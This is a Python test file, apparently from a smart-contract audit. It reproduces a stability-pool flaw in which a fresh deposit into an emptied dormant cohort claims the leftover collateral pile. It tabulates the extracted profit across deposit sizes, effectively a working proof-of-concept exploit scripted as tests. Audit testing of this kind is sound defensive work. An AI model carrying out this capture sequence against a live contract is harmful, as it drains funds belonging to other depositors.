"""Permanent characterization of Finding 1's deposit-size boundary.

After the last holder exits a dormant pile P, a replacement deposit D:
- D <= P takes the claim full-exit shortcut (StabVault.vy:844-845): equal swap,
  withdraw reverts, net 0.
- D just above P extracts a partial pile (efficiency ≈ P/D, near 100%).
- D >= ~2P extracts the full pile (efficiency → 50% at 2P, then falls).

Existing safety tests already fail at 10× / 1000× P. This file is the
reproducible table, not another red.
"""
import boa
from constants import EIGHTEEN_DECIMALS, MAX_UINT256
from conf_utils import clear_transient_storage, claim_from_stability_pool

ACTIVATION_THRESHOLD = 10**17
PILE = ACTIVATION_THRESHOLD - 1


def _empty_dormant_cohort(
    stability_pool, alpha_token, bravo_token, alpha_token_whale, bravo_token_whale,
    bob, teller, auction_house, mock_price_source, vault_book, green_token,
    savings_green, setGeneralConfig, setAssetConfig, setRipeRewardsConfig,
):
    setGeneralConfig()
    setAssetConfig(bravo_token)
    setAssetConfig(alpha_token, [1])
    setRipeRewardsConfig(_stabPoolRipePerDollarClaimed=0)
    mock_price_source.setPrice(alpha_token, EIGHTEEN_DECIMALS)
    mock_price_source.setPrice(bravo_token, EIGHTEEN_DECIMALS)
    vault_id = vault_book.getRegId(stability_pool)

    original_deposit = 100 * EIGHTEEN_DECIMALS
    alpha_token.transfer(bob, original_deposit, sender=alpha_token_whale)
    alpha_token.approve(teller, original_deposit, sender=bob)
    assert teller.deposit(
        alpha_token, original_deposit, bob, stability_pool, vault_id, sender=bob,
    ) == original_deposit
    clear_transient_storage()

    bravo_token.transfer(stability_pool, PILE, sender=bravo_token_whale)
    stability_pool.swapForLiquidatedCollateral(
        alpha_token, PILE, bravo_token, PILE, bob, green_token, savings_green,
        sender=auction_house.address,
    )
    assert teller.withdraw(
        alpha_token, MAX_UINT256, bob, stability_pool, vault_id, sender=bob,
    ) == original_deposit - PILE
    clear_transient_storage()
    assert stability_pool.totalBalances(alpha_token) == 0
    return vault_id


def _capture(
    stability_pool, alpha_token, bravo_token, alpha_token_whale, alice, teller,
    vault_id, deposit,
):
    alpha_token.transfer(alice, deposit, sender=alpha_token_whale)
    alpha_token.approve(teller, deposit, sender=alice)
    assert teller.deposit(
        alpha_token, deposit, alice, stability_pool, vault_id, sender=alice,
    ) == deposit
    clear_transient_storage()

    alice_alpha_before = alpha_token.balanceOf(alice)
    alice_bravo_before = bravo_token.balanceOf(alice)
    claim_from_stability_pool(
        teller, vault_id, alpha_token, bravo_token, sender=alice,
    )
    clear_transient_storage()
    delivered = bravo_token.balanceOf(alice) - alice_bravo_before

    try:
        teller.withdraw(
            alpha_token, MAX_UINT256, alice, stability_pool, vault_id, sender=alice,
        )
        clear_transient_storage()
        recovered = alpha_token.balanceOf(alice) - alice_alpha_before
        return delivered, recovered, recovered + delivered - deposit, False
    except boa.BoaError:
        return delivered, 0, delivered - deposit, True


def test_g5_dormant_capture_deposit_size_boundary(
    stability_pool, alpha_token, bravo_token, alpha_token_whale, bravo_token_whale,
    bob, alice, teller, auction_house, mock_price_source, vault_book, green_token,
    savings_green, setGeneralConfig, setAssetConfig, setRipeRewardsConfig,
):
    """Reproducible Finding 1 capital-efficiency table at $1."""
    cases = (
        (PILE // 4, True, 0),
        (PILE - 1, True, 0),
        (PILE, True, 0),
        (PILE + 1, False, PILE // 2),
        (2 * PILE, False, PILE - 1),
        (10 * PILE, False, PILE - 1),
    )
    for deposit, withdraw_reverts, expected_net in cases:
        with boa.env.anchor():
            vault_id = _empty_dormant_cohort(
                stability_pool, alpha_token, bravo_token, alpha_token_whale,
                bravo_token_whale, bob, teller, auction_house, mock_price_source,
                vault_book, green_token, savings_green, setGeneralConfig,
                setAssetConfig, setRipeRewardsConfig,
            )
            delivered, _recovered, net, reverted = _capture(
                stability_pool, alpha_token, bravo_token, alpha_token_whale,
                alice, teller, vault_id, deposit,
            )
            assert reverted is withdraw_reverts, (
                f"deposit={deposit}: withdraw_reverts={reverted} expected {withdraw_reverts}"
            )
            if withdraw_reverts:
                assert delivered == deposit
                assert net == 0
            else:
                assert delivered == PILE
                assert abs(net - expected_net) <= 1
